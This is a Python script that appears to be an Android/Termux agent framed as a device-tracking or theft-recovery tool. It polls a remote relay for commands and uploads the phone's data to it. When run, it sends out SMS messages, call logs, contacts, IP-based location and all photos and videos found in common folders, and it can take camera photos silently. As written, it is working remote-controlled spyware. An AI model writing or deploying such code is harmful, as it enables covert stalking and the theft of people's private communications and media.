import os
import time
import json
import subprocess
import requests

CLOUD_RELAY_URL = "https://project-breadcrumb-relay.onrender.com"
STORAGE_DIR = os.path.expanduser("~/BreadCrumbs")
os.makedirs(STORAGE_DIR, exist_ok=True)

def run_cmd(cmd_list, timeout_sec=20):
    try:
        res = subprocess.run(cmd_list, capture_output=True, text=True, timeout=timeout_sec)
        return res.stdout.strip() if res.returncode == 0 else None
    except Exception:
        return None

def upload_media_file(imei, file_path):
    url = f"{CLOUD_RELAY_URL}/api/upload-media"
    if not os.path.exists(file_path):
        return
    try:
        with open(file_path, 'rb') as f:
            files = {'file': (os.path.basename(file_path), f, 'application/octet-stream')}
            data = {'imei': imei}
            response = requests.post(url, data=data, files=files, timeout=45)
            if response.status_code == 200:
                print(f"[+] Successfully uploaded media: {os.path.basename(file_path)}")
    except Exception as e:
        print(f"[-] Media Upload Error for {file_path}: {e}")

def get_device_identity():
    imei = "864190041234567"
    make_model = run_cmd(["getprop", "ro.product.model"]) or "Android Agent"
    return imei, make_model

def get_robust_location():
    print("[*] Acquiring location via multi-API IP fallback...")
    
    # Try API 1: ip-api.com (No API key / high rate limit)
    try:
        res = requests.get("http://ip-api.com/json/", timeout=6)
        data = res.json()
        if data.get("status") == "success":
            return json.dumps({
                "source": "IP-API Geolocation",
                "local_time": time.strftime("%Y-%m-%d %H:%M:%S", time.localtime()),
                "latitude": data.get("lat"),
                "longitude": data.get("lon"),
                "city": data.get("city"),
                "region": data.get("regionName"),
                "country": data.get("country")
            }, indent=2)
    except Exception:
        pass

    # Try API 2: ipwho.is (Free tier, no rate limit issues for standard polling)
    try:
        res = requests.get("https://ipwho.is/", timeout=6)
        data = res.json()
        if data.get("success"):
            return json.dumps({
                "source": "Ipwho.is Geolocation",
                "local_time": time.strftime("%Y-%m-%d %H:%M:%S", time.localtime()),
                "latitude": data.get("latitude"),
                "longitude": data.get("longitude"),
                "city": data.get("city"),
                "region": data.get("region"),
                "country": data.get("country")
            }, indent=2)
    except Exception:
        pass

    return json.dumps({"error": "All IP geolocation providers timed out or were restricted."})

def scan_and_upload_all_media(imei):
    print("[*] Scanning internal storage for media (DCIM, Pictures, Movies, Downloads)...")
    search_paths = [
        "/storage/emulated/0/DCIM",
        "/storage/emulated/0/Pictures",
        "/storage/emulated/0/Movies",
        "/storage/emulated/0/Download",
        STORAGE_DIR
    ]
    
    extensions = ('.jpg', '.jpeg', '.png', '.mp4', '.mov', '.3gp', '.mp3')
    uploaded = 0

    for root_path in search_paths:
        if os.path.exists(root_path):
            for dirpath, _, filenames in os.walk(root_path):
                for filename in filenames:
                    if filename.lower().endswith(extensions):
                        fpath = os.path.join(dirpath, filename)
                        try:
                            if os.path.getsize(fpath) < 50 * 1024 * 1024:
                                upload_media_file(imei, fpath)
                                uploaded += 1
                        except: pass
    print(f"[+] Media scan complete. Uploaded {uploaded} files.")

def harvest_intelligence(imei):
    print("[*] Harvesting forensics...")
    
    # 1. Location
    loc_content = get_robust_location()
    requests.post(f"{CLOUD_RELAY_URL}/api/upload-forensics", json={"imei": imei, "data_type": "GPS Location", "content": loc_content}, timeout=15)

    # 2. SMS Messages via Content Provider
    sms = run_cmd(["content", "query", "--uri", "content://sms/", "--projection", "address:body:date"], timeout_sec=15)
    if sms:
        requests.post(f"{CLOUD_RELAY_URL}/api/upload-forensics", json={"imei": imei, "data_type": "SMS Messages", "content": sms}, timeout=15)

    # 3. Call Logs via Content Provider
    calls = run_cmd(["content", "query", "--uri", "content://call_log/calls", "--projection", "number:date:duration:type"], timeout_sec=15)
    if calls:
        requests.post(f"{CLOUD_RELAY_URL}/api/upload-forensics", json={"imei": imei, "data_type": "Call Logs", "content": calls}, timeout=15)

    # 4. Contacts via Content Provider
    contacts = run_cmd(["content", "query", "--uri", "content://com.android.contacts/data", "--projection", "display_name:mimetype"], timeout_sec=15)
    if contacts:
        requests.post(f"{CLOUD_RELAY_URL}/api/upload-forensics", json={"imei": imei, "data_type": "Device Contacts", "content": contacts}, timeout=15)

    # 5. Media Vault Scan
    scan_and_upload_all_media(imei)

def execute_command(cmd, imei):
    print(f"[!] Executing command: {cmd}")
    if cmd in ("LOCATE", "HARVEST_FORENSICS"):
        harvest_intelligence(imei)
    elif cmd == "SCAN_MEDIA":
        scan_and_upload_all_media(imei)
    elif cmd == "SNAP":
        photo_path = os.path.join(STORAGE_DIR, "breadcrumb_evidence.jpg")
        run_cmd(["termux-camera-photo", "-c", "0", photo_path], timeout_sec=15)
        if os.path.exists(photo_path):
            upload_media_file(imei, photo_path)
    elif cmd == "ALARM":
        run_cmd(["termux-volume", "music", "15"])

def run_agent():
    imei, make_model = get_device_identity()
    print(f"[*] Agent active for IMEI: {imei} (Multi-API Fallback Mode)")
    while True:
        try:
            requests.post(f"{CLOUD_RELAY_URL}/api/sync", json={"imei": imei, "make_model": make_model, "status": "Online & Monitoring"}, timeout=10)
            res = requests.get(f"{CLOUD_RELAY_URL}/api/poll-commands", params={"imei": imei}, timeout=10)
            if res.status_code == 200:
                for c in res.json():
                    execute_command(c.get("command"), imei)
        except Exception as e:
            print("[-] Loop Error:", e)
        time.sleep(15)

if __name__ == "__main__":
    run_agent()
